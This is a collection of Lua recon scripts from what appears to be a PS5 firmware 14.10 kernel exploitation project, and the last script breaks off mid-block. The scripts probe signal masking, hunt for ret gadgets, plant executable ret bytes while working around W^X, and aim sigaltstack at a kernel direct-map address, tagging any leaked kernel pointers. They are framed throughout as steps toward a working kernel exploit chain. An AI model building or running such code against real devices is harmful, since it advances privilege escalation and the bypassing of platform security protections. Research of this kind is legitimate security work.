## probes/phase3_signals_codexec/25c_sigprocmask.lua

```lua
-- 14.10 Recon Probe 25c: sigprocmask reliability test
-- Probe 25 crashed because signal delivered despite block
-- Need to verify sigprocmask actually works before using it
-- Strategy: block signal, send it, verify pending, then discard via SIG_IGN

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: SIGPROCMASK TEST ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_sigaction = 416,
    sc_sigaltstack = 53,
    sc_sigprocmask = 340,
    sc_sigpending = 343,
    sc_kill = 37,
    sc_getpid = 20,
})

local SA_SIZE = 64
local sa_new = memory.alloc(SA_SIZE)
local sa_old = memory.alloc(SA_SIZE)
local mask = memory.alloc(16)
local old_mask = memory.alloc(16)
local pend = memory.alloc(16)
local pid = syscall.sc_getpid():tonumber()

-- ============================================================
-- PART 1: Basic sigprocmask read/write
-- ============================================================
log("")
log("--- PART 1: sigprocmask basics ---")

-- Read current mask (SIG_SETMASK with null new = read only?)
-- Actually on FreeBSD, if new is non-NULL it sets, if NULL it just reads old
-- But we can't pass NULL in Lua... use SIG_BLOCK with empty mask
memory.write_qword(mask, 0)
memory.write_qword(mask + 8, 0)
memory.write_qword(old_mask, 0xDEADDEAD)
memory.write_qword(old_mask + 8, 0xDEADDEAD)

local pm1_ok, pm1_ret = pcall(function()
    return syscall.sc_sigprocmask(1, mask, old_mask) -- SIG_BLOCK=1, empty mask
end)
local om1_lo = memory.read_dword(old_mask):tonumber()
local om1_hi = memory.read_dword(old_mask + 4):tonumber()
log(string.format("  current mask: 0x%08x%08x rv=%s",
    om1_hi, om1_lo, pm1_ok and tostring(pm1_ret:tonumber()) or "ERR"))

-- ============================================================
-- PART 2: Block SIGUSR1 (30), verify it's blocked
-- ============================================================
log("")
log("--- PART 2: block SIGUSR1 ---")

-- FreeBSD sigset: signal N uses bit (N-1) in __bits[(N-1)/32]
-- SIGUSR1=30: bit 29 in word 0
memory.write_qword(mask, 0)
memory.write_qword(mask + 8, 0)
memory.write_dword(mask, 0x20000000) -- bit 29 = 2^29 = 0x20000000

local pm2_ok, pm2_ret = pcall(function()
    return syscall.sc_sigprocmask(1, mask, old_mask) -- SIG_BLOCK
end)
log(string.format("  block bit29: rv=%s", pm2_ok and tostring(pm2_ret:tonumber()) or "ERR"))

-- Read back
memory.write_qword(mask, 0)
memory.write_qword(old_mask, 0)
pcall(function() syscall.sc_sigprocmask(1, mask, old_mask) end) -- SIG_BLOCK empty = read
local om2_lo = memory.read_dword(old_mask):tonumber()
log(string.format("  mask after block: 0x%08x (bit29=%s)",
    om2_lo, (om2_lo >= 0x20000000) and "SET" or "clear"))

-- ============================================================
-- PART 3: Set SIGUSR1 to SIG_IGN, send it while blocked
-- ============================================================
log("")
log("--- PART 3: send blocked IGN signal ---")

for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_qword(sa_new, 1)  -- SIG_IGN
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

local k1_ok, k1_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
log("  kill(SIGUSR1) blocked+IGN: rv=" ..
    (k1_ok and tostring(k1_ret:tonumber()) or "ERR"))

-- Check pending
memory.write_qword(pend, 0)
pcall(function() syscall.sc_sigpending(pend) end)
local p1_lo = memory.read_dword(pend):tonumber()
log(string.format("  pending: 0x%08x (bit29=%s)",
    p1_lo, (p1_lo >= 0x20000000) and "SET" or "clear"))

local alive1 = pcall(function() return syscall.sc_getpid() end)
log("  alive: " .. tostring(alive1))

-- Unblock
memory.write_qword(mask, 0)
pcall(function() syscall.sc_sigprocmask(3, mask, old_mask) end) -- SIG_SETMASK=3
log("  unblocked all")

local alive2 = pcall(function() return syscall.sc_getpid() end)
log("  alive after unblock: " .. tostring(alive2))

-- ============================================================
-- PART 4: Block SIGUSR1, set REAL handler, send, verify pending
-- Then change to SIG_IGN, unblock
-- This is the critical test for the kernel altstack exploit
-- ============================================================
log("")
log("--- PART 4: block + real handler + pending ---")

-- Block SIGUSR1
memory.write_dword(mask, 0x20000000) -- bit 29
memory.write_dword(mask + 4, 0)
memory.write_qword(mask + 8, 0)
pcall(function() syscall.sc_sigprocmask(1, mask, old_mask) end)

-- Verify blocked
memory.write_qword(mask, 0)
memory.write_qword(old_mask, 0)
pcall(function() syscall.sc_sigprocmask(1, mask, old_mask) end)
local bk = memory.read_dword(old_mask):tonumber()
log(string.format("  blocked mask: 0x%08x", bk))

-- Set real handler (crash handler)
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_dword(sa_new, 0x533118f4) -- crash handler lo
memory.write_dword(sa_new + 4, 0)      -- crash handler hi
memory.write_dword(sa_new + 8, 0x0040) -- SA_SIGINFO only (no SA_ONSTACK)
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
log("  set real handler (no ONSTACK)")

-- Send SIGUSR1 while blocked
local k2_ok, k2_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
log("  kill(SIGUSR1) blocked+handler: rv=" ..
    (k2_ok and tostring(k2_ret:tonumber()) or "ERR"))

-- Check pending — SIGUSR1 should be pending
memory.write_qword(pend, 0)
pcall(function() syscall.sc_sigpending(pend) end)
local p2_lo = memory.read_dword(pend):tonumber()
log(string.format("  pending: 0x%08x (bit29=%s)",
    p2_lo, (p2_lo >= 0x20000000) and "SET" or "clear"))

local alive3 = pcall(function() return syscall.sc_getpid() end)
log("  alive (still blocked): " .. tostring(alive3))

-- NOW: change handler to SIG_IGN before unblocking
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_qword(sa_new, 1)  -- SIG_IGN
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
log("  changed to SIG_IGN")

-- Unblock — pending signal should be discarded (IGN)
memory.write_qword(mask, 0)
pcall(function() syscall.sc_sigprocmask(3, mask, old_mask) end)
log("  unblocked")

local alive4 = pcall(function() return syscall.sc_getpid() end)
log("  alive after unblock: " .. tostring(alive4))

-- Check pending cleared
memory.write_qword(pend, 0)
pcall(function() syscall.sc_sigpending(pend) end)
local p3_lo = memory.read_dword(pend):tonumber()
log(string.format("  pending after unblock: 0x%08x", p3_lo))

-- ============================================================
-- PART 5: THE REAL TEST
-- Block SIGUSR1, set real handler + SA_ONSTACK + kernel altstack
-- Send signal (pending), change handler to SIG_IGN, disable
-- altstack, unblock — if this works, we have the full chain
-- ============================================================
log("")
log("--- PART 5: full chain test (user altstack) ---")

local ss_new = memory.alloc(32)
local ss_old = memory.alloc(32)
local STACK_SZ = 16384
local test_stack = memory.alloc(STACK_SZ)

-- Fill with pattern
for i = 0, STACK_SZ - 4, 4 do
    memory.write_dword(test_stack + i, 0x22220000 + i)
end

-- Set user altstack
memory.write_qword(ss_new, test_stack)
memory.write_qword(ss_new + 8, STACK_SZ)
memory.write_dword(ss_new + 16, 0)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

-- Block SIGUSR1
memory.write_dword(mask, 0x20000000)
memory.write_dword(mask + 4, 0)
memory.write_qword(mask + 8, 0)
pcall(function() syscall.sc_sigprocmask(1, mask, old_mask) end)

-- Set real handler + SA_ONSTACK + SA_SIGINFO
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_dword(sa_new, 0x533118f4)
memory.write_dword(sa_new + 4, 0)
memory.write_dword(sa_new + 8, 0x0001 + 0x0040) -- SA_ONSTACK|SA_SIGINFO
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

-- Send (stays pending)
pcall(function() syscall.sc_kill(pid, 30) end)

-- Check pending
memory.write_qword(pend, 0)
pcall(function() syscall.sc_sigpending(pend) end)
local p4_lo = memory.read_dword(pend):tonumber()
log(string.format("  pending with handler+ONSTACK: 0x%08x", p4_lo))

-- Change to SIG_IGN
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_qword(sa_new, 1)
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

-- Disable altstack
memory.write_dword(ss_new + 16, 4) -- SS_DISABLE
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

-- Unblock
memory.write_qword(mask, 0)
pcall(function() syscall.sc_sigprocmask(3, mask, old_mask) end)

local alive5 = pcall(function() return syscall.sc_getpid() end)
log("  alive: " .. tostring(alive5))

-- Check altstack modification
local modified = 0
for i = 0, STACK_SZ - 4, 4 do
    local v = memory.read_dword(test_stack + i):tonumber()
    if v ~= 0x22220000 + i then
        modified = modified + 1
    end
end
log("  altstack modified dwords: " .. modified)

-- Cleanup
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

log("")
log("=== SIGPROCMASK TEST DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

## probes/phase3_signals_codexec/26_gadget_scan.lua

```lua
-- 14.10 Recon Probe 26: Find ret gadget for signal handler
-- We need a bare 0xC3 (ret) instruction we can use as a handler
-- The kernel sets sigreturn trampoline as return address, so
-- handler doing just "ret" → sigreturn → clean resume
-- Known code: crash handler at 0x533118f4
-- Scan nearby for 0xC3 bytes

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: GADGET SCAN ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_sigaction = 416,
    sc_sigaltstack = 53,
    sc_kill = 37,
    sc_getpid = 20,
})

local SA_SIZE = 64
local sa_new = memory.alloc(SA_SIZE)
local sa_old = memory.alloc(SA_SIZE)
local ss_new = memory.alloc(32)
local ss_old = memory.alloc(32)
local pid = syscall.sc_getpid():tonumber()

-- ============================================================
-- PART 1: Scan for ret (0xC3) near crash handler
-- ============================================================
log("")
log("--- PART 1: scan near 0x533118f4 ---")

local base = 0x533118f4
local gadgets = {}

-- Scan a window around the crash handler
for offset = -256, 512 do
    local addr = base + offset
    local ok, val = pcall(function()
        return memory.read_byte(addr)
    end)
    if ok then
        local b = val:tonumber()
        if b == 0xC3 then -- ret
            gadgets[#gadgets+1] = addr
            log(string.format("  RET at 0x%x (+%d)", addr, offset))
        end
    end
end
log("  found " .. #gadgets .. " ret gadgets")

-- Also scan for C3 preceded by common patterns:
-- 5D C3 = pop rbp; ret (function epilogue)
-- 90 C3 = nop; ret
-- C9 C3 = leave; ret
log("")
log("--- epilogue patterns ---")
for offset = -256, 512 do
    local addr = base + offset
    local ok1, v1 = pcall(function() return memory.read_byte(addr):tonumber() end)
    local ok2, v2 = pcall(function() return memory.read_byte(addr+1):tonumber() end)
    if ok1 and ok2 and v2 == 0xC3 then
        if v1 == 0x5D then -- pop rbp; ret
            log(string.format("  POP RBP; RET at 0x%x", addr))
        elseif v1 == 0xC9 then -- leave; ret
            log(string.format("  LEAVE; RET at 0x%x", addr))
        end
    end
end

-- ============================================================
-- PART 2: Scan more broadly — look at low addresses too
-- The Lua loader base might be at a predictable address
-- ============================================================
log("")
log("--- PART 2: broader scan ---")

-- Try scanning from the start of what might be the text segment
-- 0x533118f4 suggests base around 0x53000000 or similar
-- Scan function prologues: 55 48 89 E5 = push rbp; mov rbp, rsp
local scan_bases = {0x53310000, 0x53311000, 0x53312000, 0x53300000}
for _, sb in ipairs(scan_bases) do
    local ret_count = 0
    local first_ret = nil
    for i = 0, 4095 do
        local ok, val = pcall(function() return memory.read_byte(sb + i):tonumber() end)
        if ok and val == 0xC3 then
            ret_count = ret_count + 1
            if not first_ret then first_ret = sb + i end
        end
    end
    if ret_count > 0 then
        log(string.format("  0x%x: %d rets, first at 0x%x", sb, ret_count, first_ret))
    end
end

-- ============================================================
-- PART 3: Test first ret gadget as signal handler
-- Use SIGUSR1 with user altstack, check clean return
-- ============================================================
log("")
log("--- PART 3: test ret gadget ---")

if #gadgets == 0 then
    log("  no gadgets found, skipping")
else
    local gadget = gadgets[1]
    log(string.format("  testing gadget at 0x%x", gadget))

    -- Set up user altstack with pattern
    local STACK_SZ = 32768
    local test_stack = memory.alloc(STACK_SZ)
    for i = 0, STACK_SZ - 4, 4 do
        memory.write_dword(test_stack + i, 0x33330000 + i)
    end

    memory.write_qword(ss_new, test_stack)
    memory.write_qword(ss_new + 8, STACK_SZ)
    memory.write_dword(ss_new + 16, 0)
    pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

    -- Set handler to ret gadget with SA_ONSTACK|SA_SIGINFO
    for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
    -- Write address as lo/hi dwords
    local g_lo = gadget % 0x100000000
    local g_hi = math.floor(gadget / 0x100000000)
    memory.write_dword(sa_new, g_lo)
    memory.write_dword(sa_new + 4, g_hi)
    memory.write_dword(sa_new + 8, 0x0001 + 0x0040) -- SA_ONSTACK|SA_SIGINFO
    pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

    -- Send SIGUSR1
    log("  sending SIGUSR1...")
    local k_ok, k_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
    log("  kill rv=" .. (k_ok and tostring(k_ret:tonumber()) or "ERR"))

    local alive = pcall(function() return syscall.sc_getpid() end)
    log("  alive after signal: " .. tostring(alive))

    if alive then
        -- Check altstack modification
        local modified = 0
        local first_mod = -1
        for i = 0, STACK_SZ - 4, 4 do
            local v = memory.read_dword(test_stack + i):tonumber()
            if v ~= 0x33330000 + i then
                modified = modified + 1
                if first_mod < 0 then first_mod = i end
            end
        end
        log("  altstack modified dwords: " .. modified)
        if first_mod >= 0 then
            log("  first modification at offset: " .. first_mod)
            -- Dump signal frame
            log("  signal frame dump:")
            for i = first_mod, math.min(first_mod + 512, STACK_SZ - 4), 8 do
                local lo = memory.read_dword(test_stack + i):tonumber()
                local hi = memory.read_dword(test_stack + i + 4):tonumber()
                local orig_lo = (0x33330000 + i) % 0x100000000
                local orig_hi = (0x33330000 + i + 4) % 0x100000000
                if lo ~= orig_lo or hi ~= orig_hi then
                    local tag = ""
                    if hi >= 0xFFFF0000 then tag = " ***KPTR***" end
                    log(string.format("    +%04x: 0x%08x%08x%s", i, hi, lo, tag))
                end
            end
        end

        -- Disable altstack
        memory.write_dword(ss_new + 16, 4) -- SS_DISABLE
        pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

        -- ============================================================
        -- PART 4: Kernel altstack with ret gadget handler
        -- THE REAL EXPLOIT TEST
        -- ============================================================
        log("")
        log("--- PART 4: KERNEL ALTSTACK + RET GADGET ---")

        -- Set kernel DMAP altstack
        memory.write_dword(ss_new, 0x10000000)
        memory.write_dword(ss_new + 4, 0xFFFFF800)
        memory.write_qword(ss_new + 8, STACK_SZ)
        memory.write_dword(ss_new + 16, 0)
        local kss = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
        log("  set kernel altstack: " .. tostring(kss))

        -- Handler still set to ret gadget + SA_ONSTACK
        -- Send SIGUSR1 — kernel will try to build signal frame
        -- at DMAP address via copyout()
        log("  sending SIGUSR1 with kernel altstack...")
        local k2_ok, k2_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
        log("  kill rv=" .. (k2_ok and tostring(k2_ret:tonumber()) or "ERR"))

        local alive2 = pcall(function() return syscall.sc_getpid() end)
        log("  alive: " .. tostring(alive2))

        -- If we survived: either copyout() returned EFAULT (kernel validated)
        -- or the kernel actually wrote to kernel memory (!!!)
        -- Either way, this is a critical result

        -- Disable altstack
        memory.write_dword(ss_new + 16, 4)
        pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
    end

    -- Restore handler
    for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
    pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
end

log("")
log("=== GADGET SCAN DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

## probes/phase3_signals_codexec/26b_ret_gadget.lua

```lua
-- 14.10 Recon Probe 26b: Create executable ret gadget via mmap
-- Can't read code memory (execute-only or API limitation)
-- Instead: mmap RWX page, write 0xC3 (ret), use as signal handler
-- On signal delivery, kernel builds frame on altstack, calls handler
-- Handler does "ret" → sigreturn trampoline → clean resume

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: RET GADGET VIA MMAP ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_mmap = 477,
    sc_munmap = 73,
    sc_sigaction = 416,
    sc_sigaltstack = 53,
    sc_kill = 37,
    sc_getpid = 20,
    sc_mprotect = 74,
})

local SA_SIZE = 64
local sa_new = memory.alloc(SA_SIZE)
local sa_old = memory.alloc(SA_SIZE)
local ss_new = memory.alloc(32)
local ss_old = memory.alloc(32)
local pid = syscall.sc_getpid():tonumber()

-- ============================================================
-- PART 1: mmap RWX page
-- ============================================================
log("")
log("--- PART 1: mmap executable page ---")

-- mmap(NULL, 4096, PROT_RWX, MAP_ANON|MAP_PRIVATE, -1, 0)
local PROT_READ = 1
local PROT_WRITE = 2
local PROT_EXEC = 4
local MAP_PRIVATE = 2
local MAP_ANON = 0x1000

local rwx_ok, rwx_ptr = pcall(function()
    return syscall.sc_mmap(0, 4096,
        PROT_READ + PROT_WRITE + PROT_EXEC,
        MAP_PRIVATE + MAP_ANON, -1, 0)
end)

if rwx_ok then
    local addr = rwx_ptr:tonumber()
    log(string.format("  RWX mmap: 0x%x", addr))

    if addr > 0 and addr ~= 0xFFFFFFFFFFFFFFFF then
        -- Write ret instruction
        memory.write_byte(rwx_ptr, 0xC3) -- ret
        -- Verify
        local verify = memory.read_byte(rwx_ptr):tonumber()
        log(string.format("  verify byte: 0x%02x", verify))

        -- ============================================================
        -- PART 2: Test ret gadget as signal handler on user altstack
        -- ============================================================
        log("")
        log("--- PART 2: test ret handler + user altstack ---")

        local STACK_SZ = 32768
        local test_stack = memory.alloc(STACK_SZ)
        for i = 0, STACK_SZ - 4, 4 do
            memory.write_dword(test_stack + i, 0x44440000 + i)
        end

        -- Set altstack
        memory.write_qword(ss_new, test_stack)
        memory.write_qword(ss_new + 8, STACK_SZ)
        memory.write_dword(ss_new + 16, 0)
        pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

        -- Set SIGUSR1 handler to ret gadget
        for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
        memory.write_qword(sa_new, rwx_ptr)
        memory.write_dword(sa_new + 8, 0x0001 + 0x0040) -- SA_ONSTACK|SA_SIGINFO
        pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

        log("  sending SIGUSR1...")
        local k_ok, k_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
        log("  kill rv=" .. (k_ok and tostring(k_ret:tonumber()) or "ERR"))

        local alive = pcall(function() return syscall.sc_getpid() end)
        log("  alive: " .. tostring(alive))

        if alive then
            -- Check altstack modification (signal frame written?)
            local modified = 0
            local first_mod = -1
            for i = 0, STACK_SZ - 4, 4 do
                local v = memory.read_dword(test_stack + i):tonumber()
                if v ~= 0x44440000 + i then
                    modified = modified + 1
                    if first_mod < 0 then first_mod = i end
                end
            end
            log("  altstack modified dwords: " .. modified)

            if modified > 0 then
                log("  *** SIGNAL FRAME WRITTEN! ret gadget WORKS ***")
                log(string.format("  first mod at +%d", first_mod))

                -- Dump signal frame (look for kernel pointers!)
                log("  frame dump:")
                for i = first_mod, math.min(first_mod + 384, STACK_SZ - 8), 8 do
                    local lo = memory.read_dword(test_stack + i):tonumber()
                    local hi = memory.read_dword(test_stack + i + 4):tonumber()
                    if hi ~= 0x44440000 + i + 4 or lo ~= 0x44440000 + i then
                        local tag = ""
                        if hi >= 0xFFFF0000 then tag = " ***KPTR***" end
                        log(string.format("    +%04x: 0x%08x%08x%s", i, hi, lo, tag))
                    end
                end

                -- ==============================================
                -- PART 3: KERNEL ALTSTACK + RET GADGET
                -- ==============================================
                log("")
                log("--- PART 3: KERNEL ALTSTACK + RET GADGET ---")

                -- Disable current altstack
                memory.write_dword(ss_new + 16, 4) -- SS_DISABLE
                pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

                -- Set kernel DMAP altstack
                memory.write_dword(ss_new, 0x10000000)
                memory.write_dword(ss_new + 4, 0xFFFFF800)
                memory.write_qword(ss_new + 8, STACK_SZ)
                memory.write_dword(ss_new + 16, 0)
                local kss = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
                log("  set kernel DMAP altstack: " .. tostring(kss))

                -- Handler still set to ret gadget + SA_ONSTACK
                log("  sending SIGUSR1 with KERNEL altstack...")
                local k2_ok, k2_ret = pcall(function()
                    return syscall.sc_kill(pid, 30)
                end)
                log("  kill rv=" .. (k2_ok and tostring(k2_ret:tonumber()) or "ERR"))

                local alive2 = pcall(function() return syscall.sc_getpid() end)
                log("  alive after kernel altstack signal: " .. tostring(alive2))

                if alive2 then
                    log("  *** SURVIVED kernel altstack signal delivery ***")
                    log("  Possible outcomes:")
                    log("    a) copyout() validated and returned EFAULT")
                    log("    b) kernel wrote signal frame to DMAP (!!!)")
                end

                -- Disable altstack
                memory.write_dword(ss_new + 16, 4)
                pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
            else
                log("  altstack NOT modified — signal didn't use altstack")
            end
        else
            log("  CRASHED — ret gadget didn't return cleanly")
        end
    else
        log("  mmap failed (returned MAP_FAILED or 0)")

        -- Try RW then mprotect to RWX
        log("")
        log("--- fallback: mmap RW + mprotect ---")
        local rw_ok, rw_ptr = pcall(function()
            return syscall.sc_mmap(0, 4096,
                PROT_READ + PROT_WRITE,
                MAP_PRIVATE + MAP_ANON, -1, 0)
        end)
        if rw_ok then
            local rw_addr = rw_ptr:tonumber()
            log(string.format("  RW mmap: 0x%x", rw_addr))
            if rw_addr > 0 then
                memory.write_byte(rw_ptr, 0xC3)
                local mp_ok, mp_ret = pcall(function()
                    return syscall.sc_mprotect(rw_ptr, 4096,
                        PROT_READ + PROT_WRITE + PROT_EXEC)
                end)
                log("  mprotect RWX: " ..
                    (mp_ok and "rv=" .. mp_ret:tonumber() or "ERR"))

                -- Even if mprotect fails, try RW+exec (some kernels
                -- allow exec from RW pages without explicit PROT_EXEC)
                local mp2_ok, mp2_ret = pcall(function()
                    return syscall.sc_mprotect(rw_ptr, 4096,
                        PROT_READ + PROT_EXEC)
                end)
                log("  mprotect RX: " ..
                    (mp2_ok and "rv=" .. mp2_ret:tonumber() or "ERR"))
            end
        end
    end
else
    log("  mmap RWX call failed")

    -- Try without PROT_EXEC
    log("  trying RW only...")
    local rw2_ok, rw2_ptr = pcall(function()
        return syscall.sc_mmap(0, 4096,
            PROT_READ + PROT_WRITE,
            MAP_PRIVATE + MAP_ANON, -1, 0)
    end)
    if rw2_ok then
        log(string.format("  RW mmap: 0x%x", rw2_ptr:tonumber()))
    end
end

-- Cleanup
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
memory.write_dword(ss_new + 16, 4)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

log("")
log("=== GADGET DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

```lua
-- 14.10 Recon Probe 26c: W^X-safe ret gadget
-- PS5 enforces W^X: RWX mmap gives RW, executing crashes
-- Strategy: mmap RW, write 0xC3, mprotect to RX
-- Also try: find existing ret in executable memory by probing
-- handler addresses near crash handler (0x533118f4)

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: W^X GADGET ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_mmap = 477,
    sc_mprotect = 74,
    sc_munmap = 73,
    sc_sigaction = 416,
    sc_sigaltstack = 53,
    sc_kill = 37,
    sc_getpid = 20,
})

local PROT_READ = 1
local PROT_WRITE = 2
local PROT_EXEC = 4
local MAP_PRIVATE = 2
local MAP_ANON = 0x1000
local SA_SIZE = 64
local sa_new = memory.alloc(SA_SIZE)
local sa_old = memory.alloc(SA_SIZE)
local ss_new = memory.alloc(32)
local ss_old = memory.alloc(32)
local pid = syscall.sc_getpid():tonumber()

-- ============================================================
-- PART 1: mmap RW → write ret → mprotect RX
-- ============================================================
log("")
log("--- PART 1: RW mmap + mprotect RX ---")

local rw_ok, rw_ptr = pcall(function()
    return syscall.sc_mmap(0, 4096, PROT_READ + PROT_WRITE,
        MAP_PRIVATE + MAP_ANON, -1, 0)
end)

local gadget_addr = nil

if rw_ok then
    local addr = rw_ptr:tonumber()
    log(string.format("  RW mmap: 0x%x", addr))

    if addr > 0 and addr < 0xFFFFFFFF00000000 then
        -- Write ret + nop sled for safety
        memory.write_byte(rw_ptr, 0xC3) -- ret
        memory.write_byte(rw_ptr + 1, 0xC3)
        memory.write_byte(rw_ptr + 2, 0xC3)
        memory.write_byte(rw_ptr + 3, 0xC3)

        -- mprotect to RX (drop write, add exec)
        local mp_ok, mp_ret = pcall(function()
            return syscall.sc_mprotect(rw_ptr, 4096, PROT_READ + PROT_EXEC)
        end)
        local mp_rv = mp_ok and mp_ret:tonumber() or -999
        log("  mprotect(RX): rv=" .. mp_rv)

        if mp_rv == 0 then
            -- Verify we can still read (page is R)
            local rd_ok, rd_val = pcall(function()
                return memory.read_byte(rw_ptr):tonumber()
            end)
            log("  read after mprotect: " ..
                (rd_ok and string.format("0x%02x", rd_val) or "FAIL"))
            if rd_ok and rd_val == 0xC3 then
                gadget_addr = rw_ptr
                log("  *** RX gadget ready ***")
            end
        else
            -- mprotect to RX failed, try just PROT_EXEC
            local mp2_ok, mp2_ret = pcall(function()
                return syscall.sc_mprotect(rw_ptr, 4096, PROT_EXEC)
            end)
            log("  mprotect(X only): rv=" ..
                (mp2_ok and tostring(mp2_ret:tonumber()) or "ERR"))

            -- Try RWX (maybe the kernel allows it with mprotect?)
            local mp3_ok, mp3_ret = pcall(function()
                return syscall.sc_mprotect(rw_ptr, 4096,
                    PROT_READ + PROT_WRITE + PROT_EXEC)
            end)
            log("  mprotect(RWX): rv=" ..
                (mp3_ok and tostring(mp3_ret:tonumber()) or "ERR"))
        end
    end
end

-- ============================================================
-- PART 2: Alternative — try mmap with only RX from start
-- then see if we can somehow write to it
-- ============================================================
log("")
log("--- PART 2: mmap RX directly ---")

local rx_ok, rx_ptr = pcall(function()
    return syscall.sc_mmap(0, 4096, PROT_READ + PROT_EXEC,
        MAP_PRIVATE + MAP_ANON, -1, 0)
end)
if rx_ok then
    local rx_addr = rx_ptr:tonumber()
    log(string.format("  RX mmap: 0x%x", rx_addr))

    -- Check what's at offset 0 (uninitialized anon page = zeros)
    local rd_ok, rd_val = pcall(function()
        return memory.read_byte(rx_ptr):tonumber()
    end)
    log("  byte[0]: " .. (rd_ok and string.format("0x%02x", rd_val) or "FAIL"))

    -- 0x00 0x00 = ADD [RAX], AL — will likely crash
    -- But if page is zero-filled and executable, any 0xC3 at known
    -- offset in the page would work. Unfortunately we can't write.
end

-- ============================================================
-- PART 3: Try using the crash handler itself as a signal handler
-- but for a different signal, and see what sigframe looks like
-- The crash handler handles SIGILL(4), SIGBUS(10), SIGSEGV(11)
-- For SIGUSR1(30) it might behave differently
-- Actually probe 24 showed it DOES run for SIGUSR1 and corrupts Lua
--
-- Better approach: try offsets from crash handler as handler
-- If crash handler is at start of function, then (handler + N)
-- where N skips to near the end might hit a ret
-- Try small set of offsets without reading memory
-- ============================================================
log("")
log("--- PART 3: probe crash handler offsets ---")

-- The crash handler likely has a function epilogue somewhere
-- Typical sizes: small handler = 50-200 bytes
-- We'll try handler + offset as the signal handler address
-- Use SIGUSR1 with SIG_IGN first to set up altstack safely

local STACK_SZ = 32768
local test_stack = memory.alloc(STACK_SZ)

-- Set user altstack
memory.write_qword(ss_new, test_stack)
memory.write_qword(ss_new + 8, STACK_SZ)
memory.write_dword(ss_new + 16, 0)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

-- We'll test if the mprotect gadget works first
if gadget_addr then
    log("  testing mprotect RX gadget...")
    for i = 0, STACK_SZ - 4, 4 do
        memory.write_dword(test_stack + i, 0x55550000 + i)
    end

    for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
    memory.write_qword(sa_new, gadget_addr)
    memory.write_dword(sa_new + 8, 0x0001 + 0x0040)
    pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

    log("  sending SIGUSR1 to ret gadget...")
    local k_ok, k_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
    log("  kill rv=" .. (k_ok and tostring(k_ret:tonumber()) or "ERR"))

    local alive = pcall(function() return syscall.sc_getpid() end)
    log("  alive: " .. tostring(alive))

    if alive then
        local modified = 0
        local first_mod = -1
        for i = 0, STACK_SZ - 4, 4 do
            local v = memory.read_dword(test_stack + i):tonumber()
            if v ~= 0x55550000 + i then
                modified = modified + 1
                if first_mod < 0 then first_mod = i end
            end
        end
        log("  altstack modified: " .. modified .. " dwords")
        if first_mod >= 0 then
            log("  *** SIGNAL FRAME ON ALTSTACK ***")
            log(string.format("  first mod at +%d", first_mod))
            for i = first_mod, math.min(first_mod + 256, STACK_SZ - 8), 8 do
                local lo = memory.read_dword(test_stack + i):tonumber()
                local hi = memory.read_dword(test_stack + i + 4):tonumber()
                if hi ~= 0x55550000 + i + 4 or lo ~= 0x55550000 + i then
                    local tag = ""
                    if hi >= 0xFFFF0000 then tag = " ***KPTR***" end
                    log(string.format("    +%04x: 0x%08x%08x%s", i, hi, lo, tag))
                end
            end

            -- ==============================================
